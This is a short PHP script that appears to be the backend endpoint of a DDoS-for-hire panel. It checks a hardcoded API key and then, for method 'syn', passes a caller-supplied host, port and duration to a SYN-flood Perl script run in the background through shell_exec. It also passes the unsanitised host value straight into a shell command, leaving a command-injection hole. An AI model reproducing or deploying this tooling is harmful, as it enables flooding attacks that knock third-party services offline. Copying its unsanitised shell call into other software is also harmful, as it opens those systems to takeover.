<?php
ignore_user_abort(true);
set_time_limit(0);


$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];

$array = array("syn", "stop");
$ray = array("etherealhehe");


if (!empty($key)) {
} else {
    die('Error: API key is empty!');
}

if (in_array($key, $ray)) {
} else {
    die('Error: Incorrect API key!');
}


if (!empty($time)) {
} else {
    die('Error: time is empty!');
}


if (!empty($host)) {
} else {
    die('Error: Host is empty!');
}

if (!empty($port)) {
} else {
    die('Error: Port is empty!');
}


if (!empty($method)) {
} else {
    die('Error: Method is empty!');
}


if (in_array($method, $array)) {
} else {
    die('Error: The method you requested does not exist!');
}


if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}

// if (ctype_digit($time)) {
//     die('Error: Time is not in numeric form!');
// }

// if (ctype_digit($port)) {
//     die('Error: Port is not in numeric form!');
// }





if ($method == "syn") {
    $command = "screen -dm perl syn.pl $host $port 55000 $time";
}
// if ($method == "tcp") {
//     $command = "screen -dm /root/tcp $host 8 300000 $time";
// }
if ($method == "stop") {
    $command = "pkill $host -f";
}


shell_exec($command);
